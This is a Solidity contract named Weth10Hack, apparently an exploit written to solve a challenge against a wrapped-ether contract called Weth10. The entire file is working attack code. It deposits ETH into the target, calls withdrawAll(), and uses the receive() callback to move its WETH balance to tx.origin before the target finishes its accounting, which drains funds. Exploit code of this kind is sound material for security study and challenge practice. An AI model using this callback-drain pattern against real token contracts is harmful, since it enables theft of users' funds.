// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {Owned} from "solmate/auth/Owned.sol";
import {SafeTransferLib} from "solmate/utils/SafeTransferLib.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";


contract Weth10Hack is Owned {
    using SafeTransferLib for address;
    using SafeTransferLib for ERC20;

    ERC20 public weth;

    error TransactionFailed();

    constructor(address _weth) Owned(msg.sender){
        weth = ERC20(_weth);
    }

    receive() external payable {
        if(address(weth) == msg.sender) {
            weth.safeTransfer(tx.origin,weth.balanceOf(address(this)));
            tx.origin.safeTransferETH(msg.value);
        }
    }

    function getCallData() internal pure returns (bytes memory) {
        return abi.encodeWithSignature("withdrawAll()");
    }

    function deposit() external payable onlyOwner {
        address(weth).safeTransferETH(msg.value);
    }

    function hack() external payable onlyOwner {
        (bool success,) = address(weth).call(getCallData());
        
        if(!success) revert TransactionFailed();
    }
}